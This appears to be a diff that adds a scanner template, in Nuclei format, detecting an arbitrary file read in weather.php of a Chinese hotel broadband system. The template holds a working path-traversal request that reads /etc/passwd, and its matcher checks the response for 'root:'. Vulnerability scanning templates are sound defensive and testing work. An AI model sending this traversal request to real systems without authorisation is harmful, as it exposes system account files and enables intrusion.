@@ -1,0 +1,29 @@
+id: anmei-weather_php-File-reading
+
+info:
+  name: 安美数字酒店宽带运营系统 weather.php 任意文件读取
+  author: HuanXiong
+  severity: high
+
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        GET /user/weather.php?Lang=../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
